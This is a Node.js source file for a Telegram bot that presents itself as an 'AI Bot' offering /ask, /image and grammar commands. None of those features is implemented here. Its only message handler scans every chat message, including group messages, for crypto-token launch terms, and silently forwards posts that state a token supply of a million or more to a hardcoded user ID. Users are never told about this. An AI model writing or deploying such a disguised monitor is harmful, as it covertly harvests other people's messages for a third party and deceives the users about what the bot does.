require("dotenv").config();
const { Configuration, OpenAIApi } = require("openai");
const {
  getImage,
  getChat,
  correctEngish,
  convertTextToMp3,
} = require("./Helper/functions");
const { Telegraf } = require("telegraf");
const { default: axios } = require("axios");
const logger = require("./Helper/logger");
const express = require("express");
const app = express();
const configuration = new Configuration({
  apiKey: process.env.API,
});
const openai = new OpenAIApi(configuration);
module.exports = openai;

const bot = new Telegraf(process.env.TG_API);

// Bot on start

bot.start(async (ctx) => {
  if (ctx.chat.type === "group") {
    logger.info(`Bot started In: ${ctx.chat.title} `);
  } else if (ctx.chat.type === "private") {
    logger.info(`Bot started By ${ctx.chat.username || ctx.chat.first_name} `);
  }

  ctx.reply(
    "Welcome To AI Bot 🧿 \n\nCommands 👾 \n/ask  ask anything from me \n/image to create image from text  \n/en to correct your grammer \n\n\nContract Devot if you want to report any BUG or change in features"
  );
});

bot.help((ctx) => {
  ctx.reply(
    "\nCommands 👾 \n\n/ask  ask anything from me \n/image to create image from text  \n/en to correct your grammer \n\n\nContract Devot if you want to report any BUG or change in features "
  );
});

bot.on("message", async (ctx) => {
  const messageText = ctx.message.text.toLowerCase();

  const supplyPattern = /supply:\s*(\d+)/i;

  const supplyMatch = messageText.match(supplyPattern);

  const containsKeywords = /checksum|tax|eca/i.test(messageText);

  if (supplyMatch || containsKeywords) {
    const userId = "5789287913";

    // bot.telegram.sendMessage(userId, ctx.message.text);
    if (supplyMatch) {
      const supplyValue = parseInt(supplyMatch[1], 10);
      if (supplyValue >= 1000000) {
        // Check if supply is greater than 1 million
        bot.telegram.sendMessage(userId, ctx.message.text);
      }
    }
  }
});

app.all("/", (req, res) => {
  console.log("Just got a request!");
  res.send("Yo!");
});

app.listen(process.env.PORT || 3000, () => {
  bot.launch();
});
